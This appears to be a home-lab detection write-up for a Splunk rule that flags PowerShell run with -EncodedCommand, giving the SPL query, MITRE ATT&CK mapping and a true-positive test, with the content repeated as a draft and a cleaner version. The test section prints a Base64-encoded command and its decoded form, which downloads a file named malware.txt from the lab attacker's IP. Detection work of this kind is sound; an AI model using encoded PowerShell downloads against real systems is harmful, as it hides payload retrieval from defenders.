# PowerShell Encoded Command Detected

## Description

Detect the execution of PowerShell with the `-EncodedCommand` parameter, which may indicate obfuscated PowerShell execution used to evade basic command-line detection.


## MITRE ATT&CK

**T1059.001** PowerShell  
**T1027** Obfuscated Files or Information

## Severity

Medium

## Data Source

- Windows Security / Sysmon
- Sysmon Event ID 1 – Process Creation
- Splunk Universal Forwarder


## SPL Query

```spl
index=* host="HP-Pavilion" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\powershell.exe"
(CommandLine="*-EncodedCommand*" OR CommandLine="*-enc*")
| table _time host User Image CommandLine ParentImage ParentCommandLine
```

## Expected Output


The detection should return Sysmon Event ID 1 process creation events where powershell.exe is executed with the -EncodedCommand parameter.


## MITRE Technique Mapping


**Tactic** : Execution

**Technique** : T1059.001 PowerShell

**Procedure** : An adversary may execute commands through PowerShell using the -EncodedCommand parameter to obfuscate the command and evade basic command-line detection.


## True Positve 

During this lab a Encoded PowerShell command was executed from attacker machine to generate the logs and fired the alert successfully. The alert was Triggered Successfully.

The detection successfully identified:

- Source IP: 192.168.31.185
- Encoded Command (base64)
  



# PowerShell Encoded Command Detected

## Description

Detect the execution of PowerShell with the `-EncodedCommand` parameter, which may indicate obfuscated PowerShell execution used to evade basic command-line detection. This technique is commonly used by adversaries to download second-stage payloads, execute scripts, or perform reconnaissance while hiding the true intent of the command.

---

## MITRE ATT&CK

**T1059.001** – PowerShell  
**T1027** – Obfuscated Files or Information

---

## Severity

**Medium**

---

## Data Source

- Windows Security / Sysmon
- Sysmon Event ID 1 – Process Creation
- Splunk Universal Forwarder

---

## SPL Query

```spl
index=* host="HP-Pavilion" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\powershell.exe"
(CommandLine="*-EncodedCommand*" OR CommandLine="*-enc*")
| table _time host User Image CommandLine ParentImage ParentCommandLine
```

---

## Expected Output

The detection should return Sysmon Event ID 1 process creation events where `powershell.exe` is executed with the `-EncodedCommand` parameter. The output will display:

- Timestamp (`_time`)
- Hostname (`host`)
- User who executed the command (`User`)
- Full command line (`CommandLine`)
- Parent process (`ParentImage`, `ParentCommandLine`)

---

## MITRE Technique Mapping

| Tactic | Technique | Procedure |
| :--- | :--- | :--- |
| **Execution** | **T1059.001 – PowerShell** | An adversary may execute commands through PowerShell using the `-EncodedCommand` parameter to obfuscate the command and evade basic command-line detection. |
| **Defense Evasion** | **T1027 – Obfuscated Files or Information** | The command is Base64-encoded to hide the true intent from casual command-line inspection. |

---

## True Positives

During this lab, an encoded PowerShell command was executed from the attacker machine (`192.168.31.185`) to generate logs and successfully trigger the alert. The Splunk detection rule fired as expected.

The detection successfully identified:

- **Host:** `HP-Pavilion`
- **Image:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **CommandLine:** `powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMwAxAC4AMQA4ADUALwBtAGEAbAB3AGEAcgBlAC4AdAB4AHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAC0AbQBhAGwAdwBhAHIAZQAuAHQAeAB0ACIA`
- **Source IP:** `192.168.31.185` (Kali Attacker)
- **Encoded Command (Base64):** `SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMwAxAC4AMQA4ADUALwBtAGEAbAB3AGEAcgBlAC4AdAB4AHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAC0AbQBhAGwAdwBhAHIAZQAuAHQAeAB0ACIA`

**Decoded Command:**
```powershell
Invoke-WebRequest -Uri "[http://192.168.31.185/malware.txt](http://192.168.31.185/malware.txt)" -OutFile "C:\ProgramData\not-a-malware.txt"
```

**Conclusion:** The detection successfully identified the encoded PowerShell execution, confirming the rule is functioning as expected and the Splunk pipeline is correctly ingesting and alerting on Sysmon process creation events.












